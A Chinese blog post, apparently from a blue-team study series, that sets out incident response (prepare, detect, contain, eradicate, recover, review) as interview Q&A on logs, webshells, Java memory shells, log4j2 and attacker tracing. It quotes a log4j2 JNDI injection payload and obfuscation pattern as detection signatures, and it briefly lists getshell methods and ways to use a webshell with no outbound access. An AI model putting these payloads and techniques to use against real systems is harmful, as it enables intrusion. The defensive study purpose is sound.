---
title: "应急响应流程以及相关问答"
date: 2024-04-18
description: "pdcerf"
tags: ["蓝队理论"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

pdcerf：准备-检测-抑制-根除-恢复-总结。

### 准备

明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。

准备阶段首先要确定能够找到和打开日志文件。

#### windows 日志文件

日志文件存储在目录 C:\Windows\System32\winevt\Logs 里面。其中 System.evtx, Application.evtx, Security.evtx 这几个日志比较有用。系统日志和应用程序日志对系统管理员更为有用，记录的是故障排除信息；安全日志对调查员更为有用，记录登录、远程访问、进程追踪、身份认证、特权使用、策略变更等涉及安全的事件。

需要现场检查主机是否开启了日志的审核策略，例如 windows server 2008 r2 默认不开启审核策略，需要手动开启。

按 win+r 输入 eventvwr.msc 可以打开事件查看器。事件 id 有默认的含义：4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。

#### linux 日志文件

默认存放在 /var/log 目录下。

使用 more /etc/rsyslog.conf 查看日志的配置。

系统出现问题首先检查 /var/log/message，里面记录了系统的重要信息。

/var/log/secure 记录了身份认证和权限管理方面的信息，例如 ssh 登录、su 切换用户，sudo 授权。

登录方面有四个文件可供查看，都是二进制文件，不能用 vi 打开，要用特殊的命令查看。/var/log/wtmp 记录全部的登录信息，使用 last 命令查看；/var/log/utmp 记录目前处于登录状态的用户，使用 w,who,users 等命令查看；/var/log/btmp 记录错误登录，使用 lastb 命令查看；/var/log/lastlog 记录所有用户最后登录时间，使用 lastlog 命令查看。

#### linux 日志分析常用命令

#### tcp/ip 四层架构对应的常见网络协议

应用层：http/s，dns，ftp，ssh，dhcp；

传输层：tcp，udp；

网络层：ip，arp，icmp；

网络接口层：以太网 Ethernet，基于以太网的点对点通讯协议 PPPoE

#### tcp 和 udp 的区别

tcp 是面向连接的协议，发送数据前需要三次握手；udp 是无连接的协议，不需要提前确认连接就可以发送数据。

tcp 可靠，序号+握手+重传，保证了可靠性；udp 不可靠，需要应用层额外的设计来保证可靠性。

tcp 有序，后发送的数据先到达了，tcp 会按照序号重新排序；udp 无序。

tcp 传输慢；udp 传输快。

#### dns 使用的是 tcp 还是 udp

dns 通常使用 udp，在请求包较大时使用 tcp。因此使用 dns 的请求不易被 tcp 的抓包工具截获。

#### 什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用

A 类是 1.0.0.0 到 126.0.0.0；B 类是 128.0.0.0 到 191.255.255.255；C 类是 192.0.0.0 到 223.255.255.255。此外还有 D 类和 E 类。

ABC 三类 ip 分别有私有 ip 段。

10.0.0.0～10.255.255.255

172.16.0.0～172.31.255.255

192.168.0.0～192.168.255.255

子网掩码用来标识网络地址和主机地址，将网络划分为若干子网。

#### 什么是 webshell，常见的 getshell 方法

webshell 是 web 服务器的后门，攻击者利用 webshell 拿下服务器的控制权限，并且是持久性控制。后门是一个总称，木马的作用就是植入后门，webshell 就是一种特殊的木马。

常见的 getshell 方法有：

（1）利用弱口令漏洞进后台传 webshell。

（2）利用任意文件上传漏洞传 webshell。

（3）利用 rce 漏洞写 shell，植入多个后门并扩大危害。

（4）利用文件包含漏洞/解析漏洞，解析图片马。

（5）sql 注入写 shell。

#### java 内存马的原理

客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。

java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。

java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。

动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。

#### 上传 webshell 之后怎样获得绝对路径

看返回包；报错信息；fuzz；再传一个 php 探针。 

#### webshell 不出网如何利用

正向代理，建立 http 隧道；找能出网的协议，例如 dns，icmp 等。

#### 正向代理和反向代理的区别和用途

正向代理即客户端代理。用途：（1）访问原来访问不到的资源；（2）缓存，加速访问；（3）隐藏访问者的信息。

反向代理即服务器端代理。用途：（1）保证内网安全；（2）实现负载均衡，优化网站负载。

#### 怎么搭建 dns 隧道并上线 cs

#### 钻石票据、黄金票据、白银票据的区别

白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。钻石票据能够以任意用户的身份访问任意服务。

#### 设置蜜罐的时候开放哪些端口，理由是什么

#### https 加密原理，burpsuite 怎么抓 https 包

#### 常见的反爬虫机制

### 检测

研判攻击流量，保留攻击证据，确定影响的程度和范围，后期和其他厂商联动溯源，最终生成一个防守报告。

研判需要对安全设备（天眼、蜜罐、入侵检测、堡垒机、态势感知）和威胁情报平台（微步）比较熟悉。

#### 从几万条告警中区分攻击和误报

看 wireshark 判断是否为正常业务。

（1）可以记录正常业务的特征，从而在告警信息中排除正常业务。

（2）查看 ip，排除内部人员操作引起的误报。

（3）如果是扫描引起的误报，可以根据返回包的状态码和返回包大小进行判断。例如发现攻击者扫描 c 段 ip 但是返回 403 则忽略这次误报。

（4）从“待分析告警”中提取 exp，例如发现攻击者使用了某个组件 nday 的 exp，但是我们发现网站根本没有使用这个组件，则忽略这次误报。

#### 判断事件类型

根据告警确定事件类型，如果是真实攻击则封禁 ip，并检测是否利用成功。

常见的事件类型有勒索/挖矿/蠕虫/钓鱼/文件上传/webshell/反弹shell/外联/敏感操作等。

#### 判断失陷范围

根据安全设备确定受到影响的主机和资产。

#### 从告警内网 ip 确定在哪一层楼

（1）通过内网 ip 的掩码缩小搜查范围。

（2）通过 arp 请求获取 ip 的 mac 地址；

（3）从路由器 arp 缓存表找到 mac 地址对应的端口；

（4）找到设备所在位置。

#### 内网告警的处理方式

（1）根据告警信息定位到出现问题的设备；

（2）判断是否为蜜罐。

（3）如果是内网扫描先隔离；

（4）根据事件类型进行主机排查；

（5）根据日志文件进行溯源反制。

#### 怎么判断木马是否上传成功

看数据包响应码，看到 200/500 判断为疑似成功，看到 400 判断为失败；

访问木马上传路径；

自己复现攻击。

#### 天眼使用经验

#### 威胁情报平台使用经验

### 抑制

#### 阻止内网横向

允许的话直接断网，或者设置不出网的防火墙策略。严重情况业务下线。

#### log4j2 原理和流量特征

log4j2 是日志组件，其 lookups 机制存在 jndi 注入。

判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。

log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}

log4j2 使用 jndi 注入，找恶意 url。

log4j2 流量可以看到 rmi 或者 ldap 字样。

log4j2 流量会出现 dns/ip 相关特征。

log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}

log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid

#### 已知攻击者正在利用 log4j2 漏洞，怎么抑制

（1）根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。

（2）在防火墙的出站策略中阻断对常见 dnslog 平台的访问。

（3）排查内存马并清除。

（4）通知客户升级组件，进行安全加固。

（5）对攻击者进行溯源。

### 根除

#### 怎样排查内存马

（1）heapdump 内存排查。

    heapdump

    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep "POST /"

    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E "/webapps/.*?\!" | sort -u

（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马 

    find / -name *.jsp | xargs grep "pass" 

（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；

（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。

（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。

（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。

（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。

#### 怎样清除内存马

（1）客户允许的话，重启。

（2）删除 filter 中的恶意代码。

（3）中间件注销 filter。

（4）使用工具 arthas，VisualVM

#### 内存马无文件落地，怎么取证

流量监测设备找数据包；/var/log/ 日志取证；/var/cache 缓存取证；检测工具。

#### java web 中 servlet/filter/listener 的区别

servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。

servlet: 冰蝎内存马

filter: struts2

listener: spring, log4j

#### 怎样定位 webshell

查看安全日志；查看敏感目录；查看未知端口、未知进程；使用杀毒软件，D盾，进行扫描和查杀。

#### 怎样清除 webshell

终止进程；删除相关文件。

#### 杀了 webshell 还有外连流量怎样应急

（1）有可能没有完全清除 webshell；

（2）有可能其他系统被感染了，进行流量监测找到外连流量对应的系统和设备；

（3）有可能攻击者在 getshell 之后植入了后门程序，查找可疑进程，同时进行流量监测。

#### windows 权限维持方法

#### windows 排查后门程序

注册表可以看远程桌面调用历史。

#### linux 权限维持方法

#### linux 排查后门程序

#### 攻击者清理了作案痕迹怎么办

（1）使用 lsof 恢复被删除的文件；

（2）查看日志是否有新增加的用户。

#### 溯源反制手段有哪些

找到攻击者的真实 ip 地址，得到物理地址。

在威胁情报平台查询 ip 的关联事件。

如果是服务器 ip，通过网络空间测绘查询该 ip 的其他网段。

通过攻击 ip 历史 dns 解析记录/ip 反查域名，进行溯源分析。

提取样本特征、用户名、ID、邮箱、C2服务器等信息，对攻击者 id 进行追踪，通过社交平台获取攻击者个人信息。

#### 什么是攻击者画像

攻击目的、网络代理、攻击手法；

虚拟身份、真实身份、联系方式、组织情况。

### 恢复

#### 怎么恢复失陷主机的文件

找小伙伴帮忙。

### 总结

#### 攻击事件调查报告

确定告警真实性之后要生成一个攻击事件调查报告，包含以下内容。

（1）攻击者最初的攻击媒介是什么？

（2）攻击者如何访问环境？

（3）攻击者是否利用漏洞获得了访问权或特权？

（4）攻击者如何维持权限进行指挥和控制？

（5）攻击在网络或设备上是否有持久性？

（6）持久性的方法是什么？（例如后面、shell、合法凭证、远程工具）

（7）哪些账号已经被盗用，分别是什么权限？

（8）使用什么方法进行侦察？

（9）是否发生横向移动，方法是什么？（例如 rdp，恶意软件，用户账号）

（10）数据是否被泄露，类型是什么，方法是什么？

#### 写过技站法吗？

 